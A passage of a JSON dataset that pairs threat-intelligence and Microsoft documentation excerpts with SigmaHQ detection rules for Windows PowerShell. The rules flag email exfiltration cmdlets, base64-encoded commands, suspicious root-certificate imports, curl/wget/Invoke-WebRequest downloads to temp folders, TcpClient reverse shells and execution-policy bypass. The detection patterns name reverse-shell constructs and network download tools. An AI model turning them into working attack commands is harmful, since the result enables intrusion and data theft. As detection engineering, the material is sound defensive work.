      "description": "Detects email exfiltration via powershell cmdlets",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/",
        "https://github.com/Azure/Azure-Sentinel/blob/7e6aa438e254d468feec061618a7877aa528ee9f/Hunting%20Queries/Microsoft%20365%20Defender/Ransomware/DEV-0270/Email%20data%20exfiltration%20via%20PowerShell.yaml"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems),  Azure-Sentinel (idea)",
      "date": "2022-09-09",
      "tags": [
        "attack.exfiltration"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains|all": [
            "Add-PSSnapin",
            "Get-Recipient",
            "-ExpandProperty",
            "EmailAddresses",
            "SmtpAddress",
            "-hidetableheaders"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_email_exfil.yml"
  },
  "347": {
    "url": "https://github.com/Azure/Azure-Sentinel/blob/7e6aa438e254d468feec061618a7877aa528ee9f/Hunting%20Queries/Microsoft%20365%20Defender/Ransomware/DEV-0270/Email%20data%20exfiltration%20via%20PowerShell.yaml",
    "markdown": "# Azure / Azure-Sentinel ## Azure-Sentinel / Hunting Queries / Microsoft 365 Defender / Ransomware / DEV-0270 / Email data exfiltration via PowerShell.yaml id: 1115e499-45a0-470c-b0ec-e2f204831341 name: Email data exfiltration via PowerShell description: | Identify email exfiltration conducted by PowerShell. requiredDataConnectors: - connectorId: MicrosoftThreatProtection dataTypes: - DeviceProcessEvents tactics: - Exfiltration query: | DeviceProcessEvents | where FileName =~ 'powershell.exe' | where ProcessCommandLine has_all('Add-PSSnapin', 'Get-Recipient', '-ExpandProperty', 'EmailAddresses', 'SmtpAddress', '-hidetableheaders')",
    "sigma_rule": {
      "title": "Email Exifiltration Via Powershell",
      "id": "312d0384-401c-4b8b-abdf-685ffba9a332",
      "status": "test",
      "description": "Detects email exfiltration via powershell cmdlets",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/",
        "https://github.com/Azure/Azure-Sentinel/blob/7e6aa438e254d468feec061618a7877aa528ee9f/Hunting%20Queries/Microsoft%20365%20Defender/Ransomware/DEV-0270/Email%20data%20exfiltration%20via%20PowerShell.yaml"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems),  Azure-Sentinel (idea)",
      "date": "2022-09-09",
      "tags": [
        "attack.exfiltration"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains|all": [
            "Add-PSSnapin",
            "Get-Recipient",
            "-ExpandProperty",
            "EmailAddresses",
            "SmtpAddress",
            "-hidetableheaders"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_email_exfil.yml"
  },
  "348": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets",
    "markdown": "# T1059.001 - PowerShell ## Description from ATT&CK > Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the `Start-Process` cmdlet which can be used to run an executable and the `Invoke-Command` cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). > > PowerShell may also be",
    "sigma_rule": {
      "title": "Suspicious Execution of Powershell with Base64",
      "id": "fb843269-508c-4b76-8b8d-88679db22ce7",
      "status": "test",
      "description": "Commandline to launch powershell with a base64 payload",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets",
        "https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
        "https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/"
      ],
      "author": "frack113",
      "date": "2022-01-02",
      "modified": "2023-01-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -e ",
            " -en ",
            " -enc ",
            " -enco",
            " -ec "
          ]
        },
        "filter_encoding": {
          "CommandLine|contains": " -Encoding "
        },
        "filter_azure": {
          "ParentImage|contains": [
            "C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\",
            "\\gc_worker.exe"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_encode.yml"
  },
  "349": {
    "url": "https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Execution of Powershell with Base64",
      "id": "fb843269-508c-4b76-8b8d-88679db22ce7",
      "status": "test",
      "description": "Commandline to launch powershell with a base64 payload",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets",
        "https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
        "https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/"
      ],
      "author": "frack113",
      "date": "2022-01-02",
      "modified": "2023-01-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -e ",
            " -en ",
            " -enc ",
            " -enco",
            " -ec "
          ]
        },
        "filter_encoding": {
          "CommandLine|contains": " -Encoding "
        },
        "filter_azure": {
          "ParentImage|contains": [
            "C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\",
            "\\gc_worker.exe"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_encode.yml"
  },
  "350": {
    "url": "https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/",
    "markdown": "# Simple Obfuscation with PowerShell using Base64 Encoding **Jun 15, 2017** **Tags:** PowerShell I recently received a question from someone wanting to know how I encoded a string of text on my blog site. Back in January of 2013, I competed in Jeff Hicks PowerShell Challenge that was held by TrainSignal. One of the questions had an encoded command which you were to decode. I figured out that the `EncodedCommand` parameter of `PowerShell.exe` could not only be used to run commands that are encoded with Base64, but it could also be used to easily decode a string of text that",
    "sigma_rule": {
      "title": "Suspicious Execution of Powershell with Base64",
      "id": "fb843269-508c-4b76-8b8d-88679db22ce7",
      "status": "test",
      "description": "Commandline to launch powershell with a base64 payload",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets",
        "https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
        "https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/"
      ],
      "author": "frack113",
      "date": "2022-01-02",
      "modified": "2023-01-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -e ",
            " -en ",
            " -enc ",
            " -enco",
            " -ec "
          ]
        },
        "filter_encoding": {
          "CommandLine|contains": " -Encoding "
        },
        "filter_azure": {
          "ParentImage|contains": [
            "C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\",
            "\\gc_worker.exe"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_encode.yml"
  },
  "351": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/",
    "markdown": "# Profiling DEV-0270: PHOSPHORUS’ ransomware operations **Research** | **Threat intelligence** | **Threat actors** **September 7, 2022** --- > **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. > > - **PHOSPHORUS** is now tracked as **Mint Sandstorm** > - **DEV-0270** is now tracked as **Storm-0270** > > To learn more about this evolution, how the new taxonomy represents the origin, unique traits, and impact of threat actors, and a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy.",
    "sigma_rule": {
      "title": "Root Certificate Installed From Susp Locations",
      "id": "5f6a601c-2ecb-498b-9c33-660362323afa",
      "status": "test",
      "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/",
        "https://learn.microsoft.com/en-us/powershell/module/pki/import-certificate?view=windowsserver2022-ps"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2023-01-16",
      "tags": [
        "attack.defense-evasion",
        "attack.t1553.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "Import-Certificate",
            " -FilePath ",
            "Cert:\\LocalMachine\\Root"
          ],
          "CommandLine|contains": [
            "\\AppData\\Local\\Temp\\",
            ":\\Windows\\TEMP\\",
            "\\Desktop\\",
            "\\Downloads\\",
            "\\Perflogs\\",
            ":\\Users\\Public\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_import_cert_susp_locations.yml"
  },
  "352": {
    "url": "https://learn.microsoft.com/en-us/powershell/module/pki/import-certificate?view=windowsserver2022-ps",
    "markdown": "# Import-Certificate ## Reference ### Module: pki ## Description The `Import-Certificate` cmdlet imports one or more certificates into a certificate store. ## Syntax ``` Import-Certificate [-FilePath] <String> [-CertStoreLocation <String>] [-WhatIf] [-Confirm] [<CommonParameters>] ``` ## Examples ### EXAMPLE 1 ``` $params = @{ FilePath = 'C:\\Users\\Xyz\\Desktop\\BackupCert.cer' CertStoreLocation = 'Cert:\\CurrentUser\\Root' } Import-Certificate @params ``` This example imports the certificate from the file into the root store of the current user. ### EXAMPLE 2 ``` Set-Location -Path cert:\\CurrentUser\\My Import-Certificate -Filepath 'C:\\files\\intermediate.cert' ``` This example imports the certificate from the file into the current store. ### EXAMPLE 3 ``` $params = @{ FilePath =",
    "sigma_rule": {
      "title": "Root Certificate Installed From Susp Locations",
      "id": "5f6a601c-2ecb-498b-9c33-660362323afa",
      "status": "test",
      "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/",
        "https://learn.microsoft.com/en-us/powershell/module/pki/import-certificate?view=windowsserver2022-ps"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2023-01-16",
      "tags": [
        "attack.defense-evasion",
        "attack.t1553.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "Import-Certificate",
            " -FilePath ",
            "Cert:\\LocalMachine\\Root"
          ],
          "CommandLine|contains": [
            "\\AppData\\Local\\Temp\\",
            ":\\Windows\\TEMP\\",
            "\\Desktop\\",
            "\\Downloads\\",
            "\\Perflogs\\",
            ":\\Users\\Public\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_import_cert_susp_locations.yml"
  },
  "353": {
    "url": "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/",
    "markdown": "# Living Off Windows Defender | LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool **July 28, 2022** --- LockBit has been receiving a fair share of attention recently. Last week, SentinelLabs reported on LockBit 3.0 (aka LockBit Black), describing how the latest iteration of this increasingly prevalent RaaS implemented a series of anti-analysis and anti-debugging routines. Our research was quickly followed up by others reporting similar findings. Meanwhile, back in April, SentinelLabs reported on how a LockBit affiliate was leveraging the legitimate VMware command line utility, `VMwareXferlogs.exe`, in a live engagement to side load Cobalt Strike. In this post,",
    "sigma_rule": {
      "title": "Suspicious Invoke-WebRequest Execution",
      "id": "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc",
      "related": [
        {
          "id": "e218595b-bbe7-4ee5-8a96-f32a24ad3468",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location",
      "references": [
        "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-02",
      "modified": "2024-02-23",
      "tags": [
        "attack.command-and-control",
        "attack.t1105"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_commands": {
          "CommandLine|contains": [
            "curl ",
            "Invoke-WebRequest",
            "iwr ",
            "wget "
          ]
        },
        "selection_flags": {
          "CommandLine|contains": [
            " -ur",
            " -o"
          ]
        },
        "selection_susp_locations": {
          "CommandLine|contains": [
            "\\AppData\\",
            "\\Desktop\\",
            "\\Temp\\",
            "\\Users\\Public\\",
            "%AppData%",
            "%Public%",
            "%Temp%",
            "%tmp%",
            ":\\Windows\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_invoke_webrequest_download.yml"
  },
  "354": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/evolution-of-fin7/",
    "markdown": "# FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7 **April 4, 2022** --- Recent public research asserts threat groups sharing overlaps with FIN7 transitioned to targeted ransomware operations involving REVIL, DARKSIDE, BLACKMATTER, and ALPHV ransomware. With the purported shift to ransomware operations, Mandiant is publishing our research on the evolution of FIN7 which we haven’t publicly written about since Mahalo FIN7, published in 2019. This blog post draws on organic research from both historical and recent intrusions that Mandiant directly investigated, and describes the process of merging multiple UNC groups into FIN7. This process allowed us to merge",
    "sigma_rule": {
      "title": "Execution of Powershell Script in Public Folder",
      "id": "fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4",
      "status": "test",
      "description": "This rule detects execution of PowerShell scripts located in the \"C:\\Users\\Public\" folder",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/evolution-of-fin7/"
      ],
      "author": "Max Altgelt (Nextron Systems)",
      "date": "2022-04-06",
      "modified": "2022-07-14",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "-f C:\\Users\\Public",
            "-f \"C:\\Users\\Public",
            "-f %Public%",
            "-fi C:\\Users\\Public",
            "-fi \"C:\\Users\\Public",
            "-fi %Public%",
            "-fil C:\\Users\\Public",
            "-fil \"C:\\Users\\Public",
            "-fil %Public%",
            "-file C:\\Users\\Public",
            "-file \"C:\\Users\\Public",
            "-file %Public%"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_public_folder.yml"
  },
  "355": {
    "url": "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
    "markdown": "# Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities **March 2, 2021** ```image Alt: MS Exchange graphic banner Description: The image features a visual banner titled \"Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities\" with a background of circuit patterns, suggesting a technological theme. It includes key bullet points summarizing the vulnerabilities: 'Pre-auth RCE and auth bypass against Microsoft Exchange servers,' 'Leveraged by nation-state APT threat actors to steal e-mail,' and 'Webshells deployed to numerous organizations for persistent access.' Additionally, it has an illustration of the Microsoft Exchange logo with envelopes, indicating the focus on email security.",
    "sigma_rule": {
      "title": "Potential Powershell ReverseShell Connection",
      "id": "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
      "status": "stable",
      "description": "Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other.",
      "references": [
        "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
        "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
        "https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1"
      ],
      "author": "FPT.EagleEye, wagga, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-03-03",
      "modified": "2023-04-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " Net.Sockets.TCPClient",
            ".GetStream(",
            ".Write("
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "In rare administrative cases, this function might be used to check network connectivity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_reverse_shell_connection.yml"
  },
  "356": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
    "markdown": "# HAFNIUM targeting Exchange Servers with 0-day exploits **Published**: March 2, 2021 ## Updates **Update [03/16/2021]**: Microsoft released updated tools and investigation guidance to help IT Pros and incident response teams identify, remediate, defend against associated attacks: Guidance for responders: Investigating and remediating on-premises Exchange Server vulnerabilities. **Update [03/15/2021]**: Microsoft released a new one-click mitigation tool, the Microsoft Exchange On-Premises Mitigation Tool, to help customers who do not have dedicated security or IT teams to apply security updates for Microsoft Exchange Server. **Update [03/08/2021]**: Microsoft continues to see multiple actors taking advantage of unpatched systems to attack organizations with on-premises",
    "sigma_rule": {
      "title": "Potential Powershell ReverseShell Connection",
      "id": "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
      "status": "stable",
      "description": "Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other.",
      "references": [
        "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
        "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
        "https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1"
      ],
      "author": "FPT.EagleEye, wagga, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-03-03",
      "modified": "2023-04-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " Net.Sockets.TCPClient",
            ".GetStream(",
            ".Write("
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "In rare administrative cases, this function might be used to check network connectivity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_reverse_shell_connection.yml"
  },
  "357": {
    "url": "https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Powershell ReverseShell Connection",
      "id": "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
      "status": "stable",
      "description": "Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other.",
      "references": [
        "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",
        "https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",
        "https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellTcpOneLine.ps1"
      ],
      "author": "FPT.EagleEye, wagga, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-03-03",
      "modified": "2023-04-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " Net.Sockets.TCPClient",
            ".GetStream(",
            ".Write("
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "In rare administrative cases, this function might be used to check network connectivity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_reverse_shell_connection.yml"
  },
  "358": {
    "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4",
    "markdown": "# Set-Execution Policy ## Reference ### Module: Microsoft.PowerShell.Security Sets the PowerShell execution policies for Windows computers. ## Syntax ``` Set-ExecutionPolicy [-ExecutionPolicy] <ExecutionPolicy> [[-Scope] <ExecutionPolicyScope>] [-Force] [-WhatIf] [-Confirm] [<CommonParameters>] ``` ## Description The `Set-ExecutionPolicy` cmdlet changes PowerShell execution policies for Windows computers. For more information, see about_Execution_Policies. Beginning in PowerShell 6.0 for non-Windows computers, the default execution policy is `Unrestricted` and can't be changed. The `Set-ExecutionPolicy` cmdlet is available, but PowerShell displays a console message that it's not supported. An execution policy is part of the PowerShell security strategy. Execution policies determine whether you can load configuration files, such as your",
    "sigma_rule": {
      "title": "Change PowerShell Policies to an Insecure Level",
      "id": "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
      "related": [
        {
          "id": "cf2e938e-9a3e-4fe8-a347-411642b28a9f",
          "type": "similar"
        },
        {
          "id": "61d0475c-173f-4844-86f7-f3eebae1c66b",
          "type": "similar"
        },
        {
          "id": "fad91067-08c5-4d1a-8d8c-d96a21b37814",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag.",
      "references": [
        "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4",
        "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4",
        "https://adsecurity.org/?p=2604",
        "https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/"
      ],
      "author": "frack113",
      "date": "2021-11-01",
      "modified": "2023-12-13",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          }
        ],
        "selection_option": {
          "CommandLine|contains": [
            "-executionpolicy ",
            " -ep ",
            " -exec "
          ]
        },
        "selection_level": {
          "CommandLine|contains": [
            "Bypass",
            "Unrestricted"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrator scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_set_policies_to_unsecure_level.yml"
  },
  "359": {
    "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4",
    "markdown": "# about_Execution_Policies ## Short description Describes the PowerShell execution policies and explains how to manage them. ## Long description PowerShell's execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts. This feature helps prevent the execution of malicious scripts. On a Windows computer you can set an execution policy for the local computer, for the current user, or for a particular session. You can also use a Group Policy setting to set execution policies for computers and users. Execution policies for the local computer and current user are stored in the",
    "sigma_rule": {
      "title": "Change PowerShell Policies to an Insecure Level",
      "id": "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
      "related": [
        {
          "id": "cf2e938e-9a3e-4fe8-a347-411642b28a9f",
          "type": "similar"
        },
        {
          "id": "61d0475c-173f-4844-86f7-f3eebae1c66b",
          "type": "similar"
        },
        {
          "id": "fad91067-08c5-4d1a-8d8c-d96a21b37814",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag.",
      "references": [
        "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4",
        "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4",
        "https://adsecurity.org/?p=2604",
        "https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/"
      ],
      "author": "frack113",
      "date": "2021-11-01",
      "modified": "2023-12-13",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          },
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          }
        ],
        "selection_option": {
          "CommandLine|contains": [
            "-executionpolicy ",
            " -ep ",
            " -exec "
          ]
        },
        "selection_level": {
          "CommandLine|contains": [
            "Bypass",
            "Unrestricted"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrator scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_set_policies_to_unsecure_level.yml"
  },
  "360": {
    "url": "https://adsecurity.org/?p=2604",
    "markdown": "# Detecting Offensive PowerShell Attack Tools *February 11, 2016* At DerbyCon V (2015), I presented on Active Directory Attack & Defense and part of this included how to detect & defend against PowerShell attacks. Update: I presented at BSides Charm (Baltimore) on PowerShell attack & defense in April 2016. More information on PowerShell Security: PowerShell Security: PowerShell Attack Tools, Mitigation, & Detection. > **The most important take-away from this post:** you want to log all PowerShell activity and get that data into a central logging system to monitor for suspicious and anomalous activity. ## The Evolution of PowerShell as an",
    "sigma_rule": {
      "title": "Change PowerShell Policies to an Insecure Level",
      "id": "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
      "related": [
        {
          "id": "cf2e938e-9a3e-4fe8-a347-411642b28a9f",
          "type": "similar"
        },
        {
          "id": "61d0475c-173f-4844-86f7-f3eebae1c66b",
          "type": "similar"
        },
        {
          "id": "fad91067-08c5-4d1a-8d8c-d96a21b37814",
          "type": "similar"
        }
      ],
      "status": "test",
